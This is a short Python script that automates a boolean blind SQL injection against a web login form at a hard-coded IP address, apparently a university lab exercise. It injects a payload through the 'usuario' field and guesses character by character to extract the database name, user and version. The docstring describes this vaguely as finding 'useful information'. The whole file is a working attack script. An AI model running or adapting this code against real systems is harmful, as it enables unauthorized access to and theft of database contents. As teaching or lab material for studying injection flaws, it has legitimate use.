#! /usr/bin/env python
"""
This program uses recursion to find some useful information
"""

__author__ = "Aaron Castro"
__author_email__ = "aaron.castro.sanchez@outlook.com"
__copyright__ = "Aaron Castro"
__license__ = "MIT"

import requests, re, string

req = requests.session()
url = 'http://84.88.58.172/UOC/Alumnos/blindsqlinjection/'
init = ''

def remove_html(html):
    clean = re.compile('<.*?>')
    return re.sub(clean, '', html)

def look_for_exitcode(html):
    if re.search('si tiene acceso', html):
        return(True)
    else:
        return(False)
        
def extract(init, query):
    for letter in string.ascii_lowercase + string.digits + string.punctuation:
        init = init[:-1] + letter
        init = init.strip()
        payload = {'usuario': 'admin\' and substring(' + query + ',1,' + str(len(init)) + ')=\'' + init + '\'-- -'}
        r = requests.post(url, data = payload)
        if look_for_exitcode(remove_html(r.text)) == True:
            if init not in match:
                match.append(init)
            init = init + letter
            extract(init, query)
            break

match = []
extract(init, 'database()')
if match:
    print('Database name ' + max(match, key = len))
else:
    print("Database name not found!")

match = []
extract(init, 'user()')
if match:
    print('Database username ' + max(match, key = len))
else:
    print("Database username not found!")

match = []
extract(init, 'version()')
if match:
    print('Database version ' + max(match, key = len))
else:
    print("Database version not found!")